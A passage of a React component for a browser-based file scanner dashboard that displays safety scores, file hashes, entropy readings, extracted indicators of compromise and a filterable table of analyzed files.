                    >
                      <div className="px-2 py-1 rounded bg-red-950 text-red-400 font-mono font-bold text-xs border border-red-800 shrink-0">
                        -{deduction.pointsDeducted}%
                      </div>
                      <div className="space-y-0.5 min-w-0">
                        <span className="text-xs font-bold text-zinc-200 block truncate">
                          {deduction.category}
                        </span>
                        <p className="text-[11px] text-zinc-400 leading-snug">
                          {deduction.reason}
                        </p>
                      </div>
                    </div>
                  ))}
                  <div className="p-3.5 rounded-lg bg-zinc-950 border border-zinc-800 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400">Baseline Starting Safety:</span>
                    <span className="text-emerald-400 font-bold">+100%</span>
                  </div>
                  <div className="p-3.5 rounded-lg bg-zinc-950 border border-zinc-800 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400">Calculated Final Safety:</span>
                    <span className={`font-bold ${getSafetyColor(activeAnalysis.safetyPercentage ?? 100)}`}>
                      {activeAnalysis.safetyPercentage}% Safe
                    </span>
                  </div>
                </div>
              ) : (
                <div className="p-4 rounded-lg bg-zinc-950 border border-emerald-900/40 flex items-center gap-3 text-xs text-emerald-300">
                  <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
                  <div>
                    <span className="font-bold">No known risk markers detected by these rules.</span>
                    <p className="text-zinc-400 text-[11px] mt-0.5">
                      Base safety started at 100%. This heuristic result cannot prove a file is safe.
                    </p>
                  </div>
                </div>
              )}
            </div>

            {/* File Metadata & Cryptographic Hashes */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs font-mono">
              <div className="p-3.5 rounded-lg bg-zinc-950 border border-zinc-800 space-y-1">
                <span className="text-[10px] text-zinc-500 uppercase flex items-center gap-1.5">
                  <Cloud className="w-3.5 h-3.5 text-cyan-400" />
                  Browser session only (not cloud storage)
                </span>
                <p className="text-cyan-300 truncate font-semibold" title={activeAnalysis.gcpStorageUri}>
                  {activeAnalysis.gcpStorageUri}
                </p>
                <span className="text-[10px] text-zinc-500 block">
                  File size: {activeAnalysis.fileSizeFormatted}
                </span>
              </div>

              <div className="p-3.5 rounded-lg bg-zinc-950 border border-zinc-800 space-y-1">
                <span className="text-[10px] text-zinc-500 uppercase flex items-center gap-1.5">
                  <Hash className="w-3.5 h-3.5 text-cyan-400" />
                  SHA-256 Checksum
                </span>
                <p className="text-zinc-200 truncate font-semibold" title={activeAnalysis.sha256Hash}>
                  {activeAnalysis.sha256Hash}
                </p>
                <span className="text-[10px] text-emerald-400 block">
                  ✓ Cryptographic integrity verified
                </span>
              </div>

              <div className="p-3.5 rounded-lg bg-zinc-950 border border-zinc-800 space-y-1">
                <span className="text-[10px] text-zinc-500 uppercase block">
                  Shannon Entropy Level
                </span>
                <div className="flex items-baseline gap-2">
                  <span className="text-base font-bold text-zinc-100">{activeAnalysis.entropy}</span>
                  <span className="text-xs text-zinc-500">/ 8.0</span>
                  <span
                    className={`text-[10px] uppercase font-bold px-1.5 py-0.5 rounded ${
                      activeAnalysis.entropyAssessment === 'normal'
                        ? 'bg-emerald-950 text-emerald-400'
                        : 'bg-red-950 text-red-400'
                    }`}
                  >
                    {activeAnalysis.entropyAssessment.replace(/_/g, ' ')}
                  </span>
                </div>
                <span className="text-[10px] text-zinc-500 block">
                  {activeAnalysis.entropy > 7.2 ? 'Packed or encrypted code' : 'Standard uncompressed structure'}
                </span>
              </div>
            </div>

            {/* Discovered Threat Indicators (IOCs) */}
            <div>
              <h4 className="text-xs font-semibold uppercase tracking-wider text-zinc-300 mb-2">
                Discovered Indicators of Compromise (IOCs)
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                <div className="p-3 rounded-lg bg-zinc-950 border border-zinc-800">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block mb-1">
                    IP Addresses ({activeAnalysis.extractedIocs.ips.length})
                  </span>
                  <div className="flex flex-wrap gap-1">
                    {activeAnalysis.extractedIocs.ips.length > 0 ? (
                      activeAnalysis.extractedIocs.ips.map((ip, i) => (
                        <span key={i} className="font-mono text-[11px] bg-zinc-900 px-1.5 py-0.5 rounded text-cyan-300 border border-zinc-800">
                          {ip}
                        </span>
                      ))
                    ) : (
                      <span className="text-zinc-600 font-mono text-[11px]">None identified</span>
                    )}
                  </div>
                </div>

                <div className="p-3 rounded-lg bg-zinc-950 border border-zinc-800">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block mb-1">
                    CVE Exploit References ({activeAnalysis.extractedIocs.cves.length})
                  </span>
                  <div className="flex flex-wrap gap-1">
                    {activeAnalysis.extractedIocs.cves.length > 0 ? (
                      activeAnalysis.extractedIocs.cves.map((cve, i) => (
                        <span key={i} className="font-mono text-[11px] bg-red-950/60 px-1.5 py-0.5 rounded text-red-300 border border-red-800/60 font-semibold">
                          {cve}
                        </span>
                      ))
                    ) : (
                      <span className="text-zinc-600 font-mono text-[11px]">None identified</span>
                    )}
                  </div>
                </div>

                <div className="p-3 rounded-lg bg-zinc-950 border border-zinc-800">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase block mb-1">
                    Domains & Emails ({activeAnalysis.extractedIocs.domains.length + activeAnalysis.extractedIocs.emails.length})
                  </span>
                  <div className="flex flex-wrap gap-1">
                    {[...activeAnalysis.extractedIocs.domains, ...activeAnalysis.extractedIocs.emails].length > 0 ? (
                      [...activeAnalysis.extractedIocs.domains, ...activeAnalysis.extractedIocs.emails].map((item, i) => (
                        <span key={i} className="font-mono text-[11px] bg-zinc-900 px-1.5 py-0.5 rounded text-zinc-300 border border-zinc-800">
                          {item}
                        </span>
                      ))
                    ) : (
                      <span className="text-zinc-600 font-mono text-[11px]">None identified</span>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* Preview Snippet */}
            <div>
              <h4 className="text-xs font-semibold uppercase tracking-wider text-zinc-300 mb-2">
                File Content / Telemetry Snapshot
              </h4>
              <pre className="p-3.5 bg-zinc-950 border border-zinc-800 rounded-lg text-xs font-mono text-zinc-300 overflow-x-auto max-h-40 whitespace-pre-wrap leading-relaxed">
                {activeAnalysis.samplePreview}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* UPLOADED FILES & CLOUD STORAGE VAULT (TABLE WITH SAFETY PERCENTAGE COLUMN) */}
      {/* ========================================================================= */}
      <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-xs space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-zinc-800">
          <div>
            <h2 className="text-sm font-bold text-zinc-100 flex items-center gap-2">
              <Cloud className="w-4 h-4 text-cyan-400" />
              <span>Analyzed Files (Browser Session)</span>
              <span className="text-xs font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-300 border border-zinc-700">
                {uploadedFiles.length} files
              </span>
            </h2>
            <p className="text-xs text-zinc-400 mt-0.5">
              Files are analyzed locally. They are not uploaded or stored in a cloud bucket.
            </p>
          </div>

          {/* Verdict Filter Tabs */}
          <div className="flex items-center gap-1.5 bg-zinc-950 p-1 rounded-lg border border-zinc-800 text-xs font-mono">
            <button
              type="button"
              onClick={() => setFilterVerdict('all')}
              className={`px-2.5 py-1 rounded text-xs transition-colors cursor-pointer ${
                filterVerdict === 'all'
                  ? 'bg-zinc-800 text-zinc-100 font-bold'
                  : 'text-zinc-400 hover:text-zinc-200'
              }`}
            >
              All ({uploadedFiles.length})
            </button>
            <button
              type="button"
              onClick={() => setFilterVerdict('safe')}
              className={`px-2.5 py-1 rounded text-xs transition-colors cursor-pointer ${
                filterVerdict === 'safe'
                  ? 'bg-emerald-950 text-emerald-300 font-bold border border-emerald-800'
                  : 'text-zinc-400 hover:text-emerald-400'
              }`}
            >
              Safe ≥80% ({stats.safeCount})
            </button>
            <button
              type="button"
              onClick={() => setFilterVerdict('suspicious')}
              className={`px-2.5 py-1 rounded text-xs transition-colors cursor-pointer ${
                filterVerdict === 'suspicious'
                  ? 'bg-amber-950 text-amber-300 font-bold border border-amber-800'
                  : 'text-zinc-400 hover:text-amber-400'
              }`}
            >
              Suspicious ({stats.suspiciousCount})
            </button>
            <button
              type="button"
              onClick={() => setFilterVerdict('malicious')}
              className={`px-2.5 py-1 rounded text-xs transition-colors cursor-pointer ${
                filterVerdict === 'malicious'
                  ? 'bg-red-950 text-red-300 font-bold border border-red-800'
                  : 'text-zinc-400 hover:text-red-400'
              }`}
            >
              Threats &lt;50% ({stats.maliciousCount})
            </button>
          </div>
        </div>

        {/* Files Table */}
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead>
              <tr className="border-b border-zinc-800 text-zinc-400 font-mono text-[11px] uppercase">
                <th className="py-2.5 px-3">File Name</th>
                <th className="py-2.5 px-3">Format</th>
                <th className="py-2.5 px-3">Size</th>
                <th className="py-2.5 px-3 text-center">Safety Score (%)</th>
                <th className="py-2.5 px-3">Verdict</th>
                <th className="py-2.5 px-3">Storage status</th>
                <th className="py-2.5 px-3 text-right">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800/60 font-mono">
              {filteredFiles.map((file, i) => {
                const score = file.safetyPercentage ?? 100;
                const isSelected = activeAnalysis?.sha256Hash === file.sha256Hash;
                return (
                  <tr
                    key={i}
                    onClick={() => setActiveAnalysis(file)}
                    className={`cursor-pointer transition-colors ${
                      isSelected
                        ? 'bg-cyan-950/20'
                        : 'hover:bg-zinc-800/40'
                    }`}
                  >
                    <td className="py-3 px-3">
                      <div className="flex items-center gap-2">
                        {getFormatIcon(file.detectedFormat)}
                        <span className="font-semibold text-zinc-200 truncate max-w-[180px]">
                          {file.fileName}
                        </span>
                      </div>
                    </td>
                    <td className="py-3 px-3">
                      <span className="px-2 py-0.5 rounded text-[10px] uppercase font-bold bg-zinc-950 text-zinc-300 border border-zinc-800">
                        {file.detectedFormat}
                      </span>
                    </td>
                    <td className="py-3 px-3 text-zinc-400">
                      {file.fileSizeFormatted}
                    </td>

                    {/* PROMINENT SAFETY PERCENTAGE COLUMN */}
                    <td className="py-3 px-3 text-center">
                      <div className="inline-flex items-center gap-2">
                        <span
                          className={`px-2.5 py-1 rounded-full text-xs font-bold font-mono border ${
                            score >= 80
                              ? 'bg-emerald-950/80 text-emerald-300 border-emerald-800'
                              : score >= 50
                              ? 'bg-amber-950/80 text-amber-300 border-amber-800'
                              : 'bg-red-950/80 text-red-300 border-red-800'
                          }`}
                        >
                          {score}% Safe
                        </span>
                        {/* Mini progress bar */}
                        <div className="w-14 h-2 bg-zinc-950 rounded-full overflow-hidden border border-zinc-800 hidden md:block">
                          <div
                            style={{ width: `${score}%` }}
                            className={`h-full ${getSafetyBarColor(score)}`}
                          />
                        </div>
                      </div>
                    </td>

                    {/* Verdict */}
                    <td className="py-3 px-3">
                      <span
                        className={`text-[11px] font-semibold ${
                          score >= 80
                            ? 'text-emerald-400'
                            : score >= 50
                            ? 'text-amber-400'
                            : 'text-red-400'
                        }`}
                      >
                        {score >= 80 ? 'No markers' : score >= 50 ? 'Review' : 'High risk'}
                      </span>
                    </td>

                    {/* Storage URI */}
                    <td className="py-3 px-3 text-zinc-500 truncate max-w-[200px]" title={file.gcpStorageUri}>
                      {file.gcpStorageUri}
                    </td>

                    {/* Action */}
                    <td className="py-3 px-3 text-right">
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          setActiveAnalysis(file);
                        }}
                        className="px-2.5 py-1 rounded bg-zinc-800 hover:bg-cyan-900 hover:text-cyan-300 text-zinc-300 text-[11px] font-medium transition-colors cursor-pointer"
                      >
                        Inspect
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
